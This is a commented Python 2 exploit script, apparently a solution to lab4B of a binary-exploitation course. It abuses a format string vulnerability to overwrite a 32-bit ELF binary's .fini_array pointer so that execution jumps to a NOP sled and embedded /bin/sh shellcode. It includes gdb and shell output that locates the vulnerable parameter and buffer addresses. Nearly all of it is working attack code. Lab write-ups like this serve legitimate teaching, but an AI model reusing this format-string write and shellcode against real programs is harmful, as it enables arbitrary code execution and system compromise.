# Overwrite .fini_array - RELRO fully disabled. (.dtors)
# 
# .fini_array - is an array of pointers to destructors, being called before / after main().
'''
lab4B:     file format elf32-i386

Contents of section .fini_array:
 804b164 c0910408                             ....
'''

# To summarize:
#   1) Use the format string vulnerability to overwrite the .fini_array entry 
#   2) Place shellcode inside [buf]
#   3) Point the .fini_array to the beginning for the buf to get a shell

''' Check vulnearble parameter : 6th
for i in {1..10}; do echo "AAAA -- $i: %$i\$p" | ./lab4B ;done
aaaa -- 1: 0x64
aaaa -- 2: 0xf7fa7580
aaaa -- 3: 0xf7ffc7e0
aaaa -- 4: (nil)
aaaa -- 5: (nil)
aaaa -- 6: 0x61616161  <===
aaaa -- 7: 0x202d2d20
aaaa -- 8: 0x25203a38
aaaa -- 9: 0xa702439
aaaa -- 10: 0xa70
'''

''' Check offset of the buf: 0xffffce28
gdb-peda$ r 
Starting program: /home/karmaz/MBE/lab4/lab4B 
AAAA %6$P
aaaa 0x61616161

gdb-peda$ find 0x61616161
Searching for '0x61616161' in: None ranges
Found 4 results, display max 4 items:
 [heap] : 0x0804c1ac ("aaaa 0x61616161\n") <== shellcode will start here
[stack] : 0xffffbfec ("aaaa ")
[stack] : 0xffffc4c0 ("aaaa\001")
[stack] : 0xffffce28 ("aaaa %6$p\n")
'''

# .fini_array is @  0x0804b164 
# vuln param is @   6th
# buf is @          0xffffce28
import struct  
 
target_addr = 0x0804b164 # Pointer to accessible memory => .fini_array
h_target_addr = target_addr + 2 # Next 2 bytes written to 0x804b2a0

# 0x0804c1ac - heap buf beggining
value_2= 0x0804
value_1= 0xc1ac

buf = "" 
buf += struct.pack("<I",target_addr) 
buf += struct.pack("<I",h_target_addr) 
buf += "\x90" * 16
buf += "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" # shellcode /bin/sh

# Count length of character width 
count = value_1 - len(buf) 
buf += "%" + str(count) + "p"  # character width ( how many bytes to write )
buf += "%6$hn" # Direct parameter access, write the value of 2 bytes to location pointed  by 6th parameter on stack 
 
# Decrase the number of bytes to write by the number of bytes already written 
#count = int("0x1" + hex(value_2).strip("0x"),16) - value_1
count = 0x10804 - value_1
buf += "%" + str(count) + "p" 
buf += "%7$hn" # as above, but 7th parameter 
print buf
